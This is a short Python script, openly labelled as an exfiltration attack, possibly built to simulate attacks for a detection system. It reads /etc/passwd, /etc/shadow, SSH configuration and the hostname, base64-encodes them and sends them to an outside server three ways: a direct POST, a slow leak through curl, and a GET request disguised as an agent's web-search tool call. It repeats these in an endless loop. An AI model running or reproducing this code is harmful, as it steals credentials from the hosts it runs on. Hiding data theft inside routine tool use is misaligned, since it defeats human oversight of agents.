#!/usr/bin/env python3
"""Attack: Data exfiltration — reads sensitive files and sends them out via HTTP."""
import subprocess, time, random, urllib.request, json, base64, os

EXFIL_SERVER = os.environ.get("EXFIL_SERVER", "http://httpbin.org/post")
SENSITIVE_FILES = ["/etc/passwd", "/etc/shadow", "/etc/ssh/sshd_config", "/proc/version", "/etc/hostname"]

def exfil_direct():
    """Obvious exfil: read + POST."""
    target = random.choice(SENSITIVE_FILES)
    try:
        with open(target) as f:
            data = f.read()
        payload = json.dumps({"file": target, "content": base64.b64encode(data.encode()).decode()}).encode()
        req = urllib.request.Request(EXFIL_SERVER, data=payload, headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=10)
    except Exception:
        pass

def exfil_slow_leak():
    """Subtle: exfil small chunks over time."""
    try:
        with open("/etc/passwd") as f:
            lines = f.readlines()
        line = random.choice(lines).strip()
        # Encode in DNS-like query
        encoded = base64.b64encode(line.encode()).decode()[:50]
        subprocess.run(["curl", "-s", f"{EXFIL_SERVER}", "-d", encoded], capture_output=True, timeout=10)
    except Exception:
        pass

def exfil_via_tool():
    """Disguised as normal agent tool use: web_search with exfil payload in query."""
    try:
        data = subprocess.run(["cat", "/etc/hostname"], capture_output=True, text=True).stdout.strip()
        url = f"http://httpbin.org/get?q={base64.b64encode(data.encode()).decode()}"
        urllib.request.urlopen(url, timeout=10)
    except Exception:
        pass

ATTACKS = [exfil_direct, exfil_slow_leak, exfil_via_tool]

def run():
    print("[Attack] Exfiltration started")
    while True:
        attack = random.choice(ATTACKS)
        attack()
        time.sleep(random.uniform(10, 60))

if __name__ == "__main__":
    run()
